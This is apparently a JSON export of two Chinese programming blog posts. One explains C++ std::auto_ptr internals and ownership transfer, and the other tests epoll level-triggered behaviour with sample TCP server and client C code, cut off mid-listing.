[{"title":"auto_ptr 特性和源码解析","url":"/2016/11/14/autoptr/","content":"<h2 id=\"C-中-auto-ptr-特性和源码解析\"><a href=\"#C-中-auto-ptr-特性和源码解析\" class=\"headerlink\" title=\"C++ 中 auto-ptr 特性和源码解析\"></a>C++ 中 auto-ptr 特性和源码解析</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>std::auto_ptr 包含在头文件 &lt; memory &gt; 中，它被用来实现对动态分配对象的自动释放。如：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">test</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">      <span class=\"keyword\">int</span>*p=<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">      <span class=\"function\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt; <span class=\"title\">ap</span><span class=\"params\">(p)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<p>这段代码不会造成内存泄漏，因为在ap这个对象结束生命周期时，其包含的p会被自动释放。这几乎已经是auto_ptr的全部作用了，但是还有一些小秘密，下面结合它的代码看看他的实现，挖挖它的内涵。</p>\n<span id=\"more\"></span>\n\n<h3 id=\"重复释放问题\"><a href=\"#重复释放问题\" class=\"headerlink\" title=\"重复释放问题\"></a>重复释放问题</h3><p>由于auto_ptr在不同实例间没有关联，因此多个实例得到同一份指针将引起重复释放问题。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>*p=<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap1</span>(p);</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap2</span>(p);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"与指针的隐式转换\"><a href=\"#与指针的隐式转换\" class=\"headerlink\" title=\"与指针的隐式转换\"></a>与指针的隐式转换</h3><p>auto_ptr&lt; Type &gt;与 Type*指针间的隐式转换是不存在的。<br>首先指针转到auto_ptr是通过这个接口：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> _Tp element_type;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">explicit</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"title\">auto_ptr</span><span class=\"params\">(element_type* __p = <span class=\"number\">0</span>)</span> <span class=\"title\">throw</span><span class=\"params\">()</span> : _M_ptr(__p) &#123;</span> &#125;</span><br></pre></td></tr></table></figure>\n\n<p>注意到explicit这个关键字，有了这个关键字于是下面的代码是通不过的，因为他没有显式的调用构造函数，与explicit违背。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>*p=<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;ap1 = p;</span><br></pre></td></tr></table></figure>\n\n<p>而必须通过</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>*p=<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;ap1 = auto_ptr&lt;<span class=\"keyword\">int</span>&gt;(p);</span><br><span class=\"line\">或者</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap1</span>(p);</span><br></pre></td></tr></table></figure>\n\n<p>这么做的目的只可能是为了防止误用，防止在这个变量是auto_ptr还是指针上傻傻分不清。</p>\n<p>再一个从auto_ptr&lt; Type &gt;转到Type*的时候使用的是get()接口，而无法隐式转过去。</p>\n<h3 id=\"指针和取值操作\"><a href=\"#指针和取值操作\" class=\"headerlink\" title=\"指针和取值操作\"></a>指针和取值操作</h3><p>下面这个例子，如果我们对ap进行(*ap)和ap-&gt;f()操作，结果与(*p)和p-&gt;f()是否一样呢？</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">ClassABC *p=<span class=\"keyword\">new</span> <span class=\"built_in\">ClassABC</span>();</span><br><span class=\"line\">auto_ptr&lt;ClassABC&gt;<span class=\"built_in\">ap</span>(p);</span><br></pre></td></tr></table></figure>\n\n<p>我们可以通过auto_ptr的源码来知道答案， 她重载了这两个操作符，使得其操作效果和直接指针的效果是一样的：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">operator</span>*() <span class=\"function\"><span class=\"keyword\">const</span> <span class=\"title\">throw</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> *_M_ptr; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">element_type*</span><br><span class=\"line\"><span class=\"keyword\">operator</span>-&gt;() <span class=\"function\"><span class=\"keyword\">const</span> <span class=\"title\">throw</span><span class=\"params\">()</span> </span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\"><span class=\"keyword\">return</span> _M_ptr; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"特殊构造函数的特殊意义\"><a href=\"#特殊构造函数的特殊意义\" class=\"headerlink\" title=\"特殊构造函数的特殊意义\"></a>特殊构造函数的特殊意义</h3><p>我们知道拷贝构造和赋值构造函数的定义一般是：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">ClassABC</span>(<span class=\"keyword\">const</span> ClassABC&amp; c);</span><br><span class=\"line\">ClassABC&amp;</span><br><span class=\"line\"><span class=\"keyword\">operator</span>=(<span class=\"keyword\">const</span> ClassABC&amp; c);</span><br></pre></td></tr></table></figure>\n\n<p>他们的参数都是const类型的，但是auto_ptr却不是const类型的，原因是什么呢？</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">auto_ptr</span>(auto_ptr&amp; __a) <span class=\"keyword\">throw</span>() : _M_ptr(__a.<span class=\"built_in\">release</span>()) &#123; &#125;</span><br><span class=\"line\">auto_ptr&amp;</span><br><span class=\"line\"><span class=\"keyword\">operator</span>=(auto_ptr&amp; __a) <span class=\"built_in\"><span class=\"keyword\">throw</span></span>()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"><span class=\"built_in\">reset</span>(__a.<span class=\"built_in\">release</span>());</span><br><span class=\"line\"><span class=\"keyword\">return</span> *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p> 涉及到一个控制权的问题，auto_ptr假设只有一个实例是持有这个指针的，否则必然导致重复释放，所以当把一个auto_ptr实例赋值给另一个auto_ptr实例时：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">int</span>*p=<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap1</span>(p);</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap2</span>(ap1);</span><br></pre></td></tr></table></figure>\n\n<p>前者（ap1）的实例必须放弃这个指针(p)而把它交给后者(ap2)。而这个放弃的操作必然会修改该实例(ap1)内部数据，于是它不能是const类型，只能是非const类型的。而非const的参数类型不能接收的有，一个是const类型的，还有一个是临时变量。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 这是接收临时变量的两个例子</span></span><br><span class=\"line\">   auto_ptr&lt;<span class=\"keyword\">int</span>&gt;ap1=auto_ptr&lt;<span class=\"keyword\">int</span>&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>));</span><br><span class=\"line\">   auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap2</span>(auto_ptr&lt;<span class=\"keyword\">int</span>&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>)));</span><br></pre></td></tr></table></figure>\n\n<p>要接收const类型没办法实现。但是接收临时变量还是有办法的，看下面：</p>\n<h3 id=\"auto-ptr-ref类\"><a href=\"#auto-ptr-ref类\" class=\"headerlink\" title=\"auto_ptr_ref类\"></a>auto_ptr_ref类</h3><p>于是牛人想出了一个方案来支持临时变量的赋值。Bill Gibbons和Greg Colvin创造性地提出了auto_ptr_ref类，解决了无法传递临时变量的问题。</p>\n<p>思路是这样的，注意推导过程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">为了接收 auto_ptr&lt;TYPE&gt;类型的临时变量，我可以选择的形参有const auto_ptr&lt;TYPE&gt;&amp;或者auto_ptr&lt;TYPE&gt;&amp; 或者auto_ptr&lt;TYPE&gt; 3种参数类型。</span><br><span class=\"line\">1. const auto_ptr&lt;TYPE&gt;&amp;因为不支持修改而排除； </span><br><span class=\"line\">2. auto_ptr&lt;TYPE&gt;&amp;支持修改，但是对临时变量只能const引用，不能直接引用，而const引用刚才已经排除了，所以这也不行；</span><br><span class=\"line\">3. auto_ptr&lt;TYPE&gt;呢，编译器说这么定义不行，你可以试试。这会导致逻辑上的死循环，假如你要使用临时变量A0来构造B，由于形参不是引用类型，所以你必须从A0拷贝一份A1传入B，于是你又陷入如何从临时变量A0生成临时的变量A1，从A0到A1和从A0到B的问题依然是同一个。</span><br></pre></td></tr></table></figure>\n\n<p>于是我们只能新创建一个类叫做auto_ptr_ref&lt; TYPE &gt;。 然后给auto_ptr增加新的构造函数：</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">auto_ptr</span>(auto_ptr_ref&lt;TYPE&gt; __ref)</span><br></pre></td></tr></table></figure>\n\n<p>然后你应该猜到了，我们再给auto_ptr增加新的类型转换函数，支持转换到auto_ptr_ref&lt; TYPE &gt;。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp1&gt;</span><br><span class=\"line\">    <span class=\"keyword\">operator</span> auto_ptr_ref&lt;_Tp1&gt;()</span><br></pre></td></tr></table></figure>\n\n<p>好了大功告成，临时变量auto_ptr&lt; TYPE &gt;先转成auto_ptr_ref&lt; TYPE &gt;，auto_ptr_ref&lt; TYPE &gt;再传到构造函数中，有了这个auto_ptr_ref类，下面的代码已经可以编过了，如果刚才前面小节中，你去试了发现明明能编过我却说不行，请不要奇怪。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;ap1=auto_ptr&lt;<span class=\"keyword\">int</span>&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>));</span><br><span class=\"line\">auto_ptr&lt;<span class=\"keyword\">int</span>&gt;<span class=\"built_in\">ap1</span>(auto_ptr&lt;<span class=\"keyword\">int</span>&gt;(<span class=\"keyword\">new</span> <span class=\"built_in\"><span class=\"keyword\">int</span></span>(<span class=\"number\">0</span>)));</span><br></pre></td></tr></table></figure>\n\n<p>但是对于const类型的实参还是没法运作的，因为operator auto_ptr_ref&lt; _Tp1 &gt;()是非const的，const对象调不到这个成员函数。</p>\n<h3 id=\"不同指针实例间的赋值\"><a href=\"#不同指针实例间的赋值\" class=\"headerlink\" title=\"不同指针实例间的赋值\"></a>不同指针实例间的赋值</h3><p>假如我们有两个实例，这两个实例的对应指针是不同的，那么我们能对他们进行赋值吗？</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">    <span class=\"comment\">//关键代码就是对_M_ptr这个变量进行了赋值。</span></span><br><span class=\"line\">    <span class=\"comment\">//template&lt;typename _Tp&gt;</span></span><br><span class=\"line\">    <span class=\"comment\">//_Tp* _M_ptr;</span></span><br><span class=\"line\">    <span class=\"comment\">//所以_M_ptr就是指针类型的变量。</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp1&gt;</span></span><br><span class=\"line\"><span class=\"function\">      <span class=\"title\">auto_ptr</span><span class=\"params\">(auto_ptr&lt;_Tp1&gt;&amp; __a)</span> <span class=\"title\">throw</span><span class=\"params\">()</span> : _M_ptr(__a.release()) &#123;</span> &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">template</span>&lt;<span class=\"keyword\">typename</span> _Tp1&gt;</span><br><span class=\"line\">      auto_ptr&amp;</span><br><span class=\"line\">      <span class=\"keyword\">operator</span>=(auto_ptr&lt;_Tp1&gt;&amp; __a) <span class=\"built_in\"><span class=\"keyword\">throw</span></span>()</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">      <span class=\"built_in\">reset</span>(__a.<span class=\"built_in\">release</span>()); <span class=\"comment\">//</span></span><br><span class=\"line\">      <span class=\"keyword\">return</span> *<span class=\"keyword\">this</span>;</span><br><span class=\"line\">&#125; </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//其中reset的实现如下</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">void</span></span></span><br><span class=\"line\"><span class=\"function\">    <span class=\"title\">reset</span><span class=\"params\">(element_type* __p = <span class=\"number\">0</span>)</span> <span class=\"title\">throw</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__p != _M_ptr)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"keyword\">delete</span> _M_ptr;</span><br><span class=\"line\">      _M_ptr = __p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>可以看出A=B这样的表达式中，只要B对应的指针类型能够赋值给A对应的指针类型，那么这个赋值就是可行的。比如父子类之间。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"code\"><pre><span class=\"line\">SON *pson = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">   <span class=\"function\">auto_ptr&lt;SON&gt; <span class=\"title\">ap1</span><span class=\"params\">(pson)</span></span>;</span><br><span class=\"line\">   <span class=\"function\">auto_ptr&lt;FATHER&gt; <span class=\"title\">ap2</span><span class=\"params\">(ap1)</span></span>;</span><br></pre></td></tr></table></figure>\n\n<p>而反过来把FATHER赋给SON就会报错了。</p>\n<h3 id=\"命运\"><a href=\"#命运\" class=\"headerlink\" title=\"命运\"></a>命运</h3><p>说了这么多，好像很高级的样子，但是std::auto_ptr在最新的c++11标准草案中被std::unique_ptr取代。主要原因是auto_ptr在进行赋值时默默进行着控制权转移，而这个动作容易导致对失去控制权的实例的错误使用。一个特别的例子是把auto_ptr放到容器中时。下偏讲unique_ptr时讲。</p>\n","categories":["代码"],"tags":["西佳佳"]},{"title":"Epoll Level Trigger","url":"/2017/04/09/epollleveltrigger/","content":"<h2 id=\"epoll-中level-trigger的检验\"><a href=\"#epoll-中level-trigger的检验\" class=\"headerlink\" title=\"epoll 中level trigger的检验\"></a>epoll 中level trigger的检验</h2><h3 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h3><p>在我们通过网络搜索的时候，关于epoll的水平触发的解释通常是这样的：</p>\n<p>水平触发：只要缓冲区还有数据，内核就还会通知用户。用户如果第一次读取数据没读完，即使没有任何新的操作触发，还是可以继续通过epoll_wait来获取事件。</p>\n<p>这段解释水平触发的话应该来说是没有错的，然而这段话并不总是如你所想的，说这句话的人不会告诉你什么场景满足什么场景是不满足的。我就是要说一个你一定以为满足，实际上却不满足的场景。</p>\n<p>我们先来看成立的情况：</p>\n<span id=\"more\"></span>\n\n<h3 id=\"Work-Good\"><a href=\"#Work-Good\" class=\"headerlink\" title=\"Work Good\"></a>Work Good</h3><p>首先tcpservcer启动</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">root@localhost]# ./tcp</span><br><span class=\"line\">[epoll thread create. sock = 3]</span><br></pre></td></tr></table></figure>\n\n<p>接着client启动并发送字符串</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost reuseport]# ./tcpclient </span><br><span class=\"line\">send 12345...</span><br></pre></td></tr></table></figure>\n\n<p>接着server 的epoll由于水平触发，被触发多次，每次接收两个字符</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[epoll awake. event sock = 3]</span><br><span class=\"line\">[ACCEPT SOCKET 5]=====================</span><br><span class=\"line\">[epoll awake. event sock = 5]</span><br><span class=\"line\">recv 2 byte[12] from sock 5</span><br><span class=\"line\">[epoll awake. event sock = 5]</span><br><span class=\"line\">recv 2 byte[34] from sock 5</span><br><span class=\"line\">[epoll awake. event sock = 5]</span><br><span class=\"line\">recv 1 byte[5] from sock 5</span><br></pre></td></tr></table></figure>\n\n<p>可以看到一切都按照预期的进行着，水平触发在没有接受完的时候就可以一直被触发。</p>\n<h4 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//tcp.c</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;assert.h&gt;</span><br><span class=\"line\">#include &lt;errno.h&gt;</span><br><span class=\"line\">#include &lt;sys/types.h&gt;</span><br><span class=\"line\">#include &lt;sys/socket.h&gt;</span><br><span class=\"line\">#include &lt;netinet/in.h&gt;</span><br><span class=\"line\">#include &lt;fcntl.h&gt;</span><br><span class=\"line\">#include &lt;sys/epoll.h&gt;</span><br><span class=\"line\">#include &lt;pthread.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int createServerSocket()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int sock = socket(PF_INET, SOCK_STREAM, 0);</span><br><span class=\"line\">    assert(sock &gt; 0);</span><br><span class=\"line\">    return sock;    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void bindSocket(int _socket, int _port)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    struct sockaddr_in     servaddr;</span><br><span class=\"line\">    memset(&amp;servaddr, 0, sizeof(servaddr));</span><br><span class=\"line\">    servaddr.sin_family = AF_INET;</span><br><span class=\"line\">    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class=\"line\">    servaddr.sin_port = htons(_port);</span><br><span class=\"line\">    </span><br><span class=\"line\">    int ret = bind(_socket, (struct sockaddr*)&amp;servaddr, sizeof(servaddr));</span><br><span class=\"line\">    assert(ret == 0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void make_socket_addr_reuse (int _socket)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    int optval = 1;</span><br><span class=\"line\">    int ret1 = setsockopt(_socket, SOL_SOCKET, SO_REUSEADDR, &amp;optval, sizeof(optval));</span><br><span class=\"line\">    int ret2 = setsockopt(_socket, SOL_SOCKET, SO_REUSEPORT, &amp;optval, sizeof(optval));</span><br><span class=\"line\"></span><br><span class=\"line\">    assert(ret1 == 0);</span><br><span class=\"line\">    assert(ret2 == 0);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void listenSocket(int _socket)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    listen(_socket,5);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void make_socket_non_blocking (int _socket)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  int flags = fcntl (_socket, F_GETFL, 0);</span><br><span class=\"line\">  assert(flags != -1);</span><br><span class=\"line\"></span><br><span class=\"line\">  flags |= O_NONBLOCK;</span><br><span class=\"line\">  int ret = fcntl (_socket, F_SETFL, flags);</span><br><span class=\"line\">  assert(ret == 0);</span><br><span class=\"line\"></span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int createEpoll(int _size)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int epollfd = epoll_create(_size);</span><br><span class=\"line\">    assert(epollfd &gt; 0);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void epollClear(int _epoll, int fd)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int ret = epoll_ctl(_epoll, EPOLL_CTL_DEL, fd, NULL);</span><br><span class=\"line\">    assert(0 == ret);   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void epollAddET(int _epoll, int fd, int mask)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    struct epoll_event epEvent;</span><br><span class=\"line\">    memset(&amp;epEvent, 0,sizeof(epEvent));</span><br><span class=\"line\">    epEvent.data.fd = fd;</span><br><span class=\"line\">    epEvent.events = mask | EPOLLET;</span><br><span class=\"line\">    </span><br><span class=\"line\">    int ret = epoll_ctl(_epoll, EPOLL_CTL_ADD, fd, &amp;epEvent);</span><br><span class=\"line\">    assert(0 == ret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void epollAddLT(int _epoll, int fd, int mask)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        struct epoll_event epEvent;</span><br><span class=\"line\">        memset(&amp;epEvent, 0,sizeof(epEvent));</span><br><span class=\"line\">        epEvent.data.fd = fd;</span><br><span class=\"line\">        epEvent.events = mask;</span><br><span class=\"line\"></span><br><span class=\"line\">        int ret = epoll_ctl(_epoll, EPOLL_CTL_ADD, fd, &amp;epEvent);</span><br><span class=\"line\">        assert(0 == ret);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int epollwait(int _epoll, struct epoll_event *events, int _maxEvents)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    int ret = epoll_wait(_epoll, events, _maxEvents, -1);</span><br><span class=\"line\">    assert(ret &gt; 0);</span><br><span class=\"line\">    </span><br><span class=\"line\">    return ret;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">void handleClientSock(int _epollfd, int clientSock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char recv_buffer[2]=&quot;&quot;;</span><br><span class=\"line\">    int bytes = read(clientSock, recv_buffer, sizeof(recv_buffer));</span><br><span class=\"line\">    printf(&quot;recv %d byte[%s] from sock %d\\n&quot;, bytes,recv_buffer, clientSock);</span><br><span class=\"line\">    if(bytes &lt;= 0)&#123;</span><br><span class=\"line\">        //printf(&quot;close sock %d\\n&quot;, clientSock);</span><br><span class=\"line\">        epollClear(_epollfd, clientSock);</span><br><span class=\"line\">        close(clientSock);</span><br><span class=\"line\">        printf(&quot;[CLOSE SOCKET %d]=====================\\n&quot;,clientSock);</span><br><span class=\"line\">    &#125;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void handleAcceptSock(int _epollfd, int serverSock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    struct sockaddr_in client_addr;</span><br><span class=\"line\">    socklen_t client_len = sizeof(client_addr);</span><br><span class=\"line\">    int client = accept(serverSock, (struct sockaddr *)&amp;client_addr, &amp;client_len);</span><br><span class=\"line\"></span><br><span class=\"line\">    assert(client &gt; 0);</span><br><span class=\"line\">    epollAddLT(_epollfd, client, EPOLLIN);</span><br><span class=\"line\">    printf(&quot;[ACCEPT SOCKET %d]=====================\\n&quot;,client);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void* masterThreadBody(void *arg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int epollfd = createEpoll(100);</span><br><span class=\"line\">    int tcpsocket = (int)arg;</span><br><span class=\"line\">    printf(&quot;[epoll thread create. sock = %d]\\n&quot;, tcpsocket);</span><br><span class=\"line\">    epollAddET(epollfd, tcpsocket, EPOLLIN);</span><br><span class=\"line\">    </span><br><span class=\"line\">    struct epoll_event fired_events[100];</span><br><span class=\"line\">    while(1)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        int eventCount = epollwait(epollfd, fired_events, 100);</span><br><span class=\"line\">        assert(eventCount &gt; 0);</span><br><span class=\"line\">        </span><br><span class=\"line\">        int i=0;</span><br><span class=\"line\">        for(;i&lt;eventCount;i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            printf(&quot;[epoll awake. event sock = %d]\\n&quot;, fired_events[i].data.fd);</span><br><span class=\"line\">            if(fired_events[i].data.fd == tcpsocket)&#123;</span><br><span class=\"line\">                handleAcceptSock(epollfd,fired_events[i].data.fd);</span><br><span class=\"line\">            &#125;else&#123;</span><br><span class=\"line\">                handleClientSock(epollfd,fired_events[i].data.fd);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    return NULL;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">pthread_t createMasterThread(int tcpSock)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    pthread_t tid;</span><br><span class=\"line\">    int ret = pthread_create(&amp;tid,NULL,masterThreadBody,(void*)tcpSock);</span><br><span class=\"line\">    assert(ret == 0);</span><br><span class=\"line\">    </span><br><span class=\"line\">    return tid;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int main(int argc, char** argv)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int sock = createServerSocket();</span><br><span class=\"line\">    make_socket_addr_reuse(sock);</span><br><span class=\"line\">    bindSocket(sock, 666);</span><br><span class=\"line\">    listenSocket(sock);</span><br><span class=\"line\">    pthread_t tid = createMasterThread(sock);</span><br><span class=\"line\">    </span><br><span class=\"line\">    pthread_join(tid, NULL);</span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">//tcpclient.c</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;assert.h&gt;</span><br><span class=\"line\">#include &lt;errno.h&gt;</span><br><span class=\"line\">#include &lt;sys/types.h&gt;</span><br><span class=\"line\">#include &lt;sys/socket.h&gt;</span><br><span class=\"line\">#include &lt;netinet/in.h&gt;</span><br><span class=\"line\">#include &lt;fcntl.h&gt;</span><br><span class=\"line\">#include &lt;sys/epoll.h&gt;</span><br><span class=\"line\">#include &lt;pthread.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">int createServerSocket()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    int sock = socket(PF_INET, SOCK_STREAM, 0);</span><br><span class=\"line\">    assert(sock &gt; 0);</span><br><span class=\"line\">    return sock;    </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void make_socket_addr_reuse (int _socket)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    int optval = 1;</span><br><span class=\"line\">    int ret1 = setsockopt(_socket, SOL_SOCKET, SO_REUSEADDR, &amp;optval, sizeof(optval));</span><br><span class=\"line\">    int ret2 = setsockopt(_socket, SOL_SOCKET, SO_REUSEPORT, &amp;optval, sizeof(optval));</span><br><span class=\"line\"></span><br><span class=\"line\">    assert(ret1 == 0);</span><br><span class=\"line\">    assert(ret2 == 0);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void bindSocket(int _socket, int _port)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    struct sockaddr_in     servaddr;</span><br><span class=\"line\">    memset(&amp;servaddr, 0, sizeof(servaddr));</span><br><span class=\"line\">    servaddr.sin_family = AF_INET;</span><br><span class=\"line\">    servaddr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class=\"line\">    servaddr.sin_port = htons(_port);</span><br><span class=\"line\">    int ret = bind(_socket, (struct sockaddr*)&amp;servaddr, sizeof(servaddr));</span><br><span class=\"line\">    assert(ret == 